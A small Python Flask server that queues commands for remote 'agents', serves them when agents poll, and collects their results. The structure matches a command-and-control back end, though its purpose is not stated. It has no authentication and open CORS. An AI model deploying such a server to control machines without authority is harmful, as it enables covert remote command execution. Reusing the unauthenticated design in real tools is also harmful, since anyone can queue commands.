from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

# Store results per agent
agent_results = {}
# Simple in-memory command queue
agent_commands = {}

@app.route("/api/command", methods=["POST"])
def handle_command():
    data = request.get_json()
    if not data or "agent_id" not in data or "command" not in data:
        return jsonify({"status": "error", "message": "Missing agent_id or command"}), 400

    agent_id = data["agent_id"]
    command = data["command"]
    print(f"✅ Command '{command}' queued for agent '{agent_id}'")
    agent_commands[agent_id] = command
    return jsonify({"status": "success", "message": f"Command '{command}' queued for agent '{agent_id}'"})


@app.route("/api/get-command", methods=["POST"])
def get_command():
    data = request.get_json()
    agent_id = data.get("agent_id")
    if not agent_id:
        return jsonify({"status": "error", "message": "Missing agent_id"}), 400

    command = agent_commands.pop(agent_id, None)
    if command:
        return jsonify({"status": "command", "command": command})
    return jsonify({"status": "idle"})


@app.route("/api/command-result", methods=["POST"])
def command_result():
    data = request.get_json()
    agent_id = data.get("agent_id")
    result = data.get("result")

    if agent_id and result is not None:
        agent_results[agent_id] = result
        print(f"🟩 Agent {agent_id} responded with:\n{result}")
        return jsonify({"status": "success"})
    return jsonify({"status": "error", "message": "Missing agent_id or result"}), 400


@app.route("/api/command-results/<agent_id>", methods=["GET"])
def get_result(agent_id):
    if agent_id in agent_results:
        return jsonify({"result": agent_results[agent_id]})
    return jsonify({"result": None}), 200


@app.route("/api/agents", methods=["GET"])
def get_agents():
    # Dummy agent for now
    agents = [
        {
            "agent_id": "A01",
            "hostname": "test-host",
            "ip_address": "10.0.0.5",
            "status": "Online",
            "last_check_in": "Just now"
        }
    ]
    return jsonify(agents)
